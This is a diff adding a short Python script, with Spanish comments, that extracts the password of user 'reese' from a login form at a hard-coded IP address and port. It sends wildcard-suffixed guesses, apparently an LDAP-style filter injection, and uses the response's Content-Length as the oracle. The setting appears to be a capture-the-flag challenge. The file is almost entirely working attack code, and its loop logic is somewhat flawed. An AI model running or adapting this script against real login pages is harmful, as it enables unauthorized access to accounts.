@@ -1,0 +1,47 @@
+#!/usr/bin/python3
+
+import requests
+
+import string, signal, sys
+
+
+#Ctrl_C
+
+def code_exiting(sig, frame):
+
+    print("\n[!] Saliendo...\n")
+
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, code_exiting)
+
+
+#Variables Goblales
+
+main_url = "http://167.172.55.94:31423/login"
+
+characters = string.ascii_letters + string.digits + "_{}()"
+
+password = ""
+
+while True:
+
+
+    for character in characters:
+        
+        tmp = password + character + "*"
+        
+        
+        data = {'username':'reese', 'password':tmp}
+        
+        r = requests.post(main_url, data=data)
+        
+        if r.headers["Content-Length"] == "2586":
+
+            password += character
+
+        elif character == ")":
+
+            print(password)
+
+            break
